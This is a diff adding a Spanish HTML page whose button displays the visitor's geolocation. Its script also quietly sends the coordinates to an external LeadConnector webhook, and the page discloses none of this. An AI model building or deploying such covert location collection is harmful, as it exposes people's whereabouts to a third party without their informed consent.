@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Obtener Ubicación</title>
+</head>
+<body>
+    <button onclick="obtenerUbicacion()">Obtener Ubicación</button>
+    <p id="ubicacion"></p>
+    <script>
+        function obtenerUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(mostrarPosicion);
+            } else {
+                document.getElementById('ubicacion').innerHTML = "La geolocalización no es soportada por este navegador.";
+            }
+        }
+
+        function mostrarPosicion(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            document.getElementById('ubicacion').innerHTML = "Latitud: " + lat + "<br>Longitud: " + lon;
+            
+            var webhookUrl = "https://services.leadconnectorhq.com/hooks/p3X1MbfgZ6daPGTTiwQH/webhook-trigger/625f8a88-5cb4-4f26-a074-4dfa78aec6a5";
+            var data = { location: "Latitud: " + lat + ", Longitud: " + lon };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
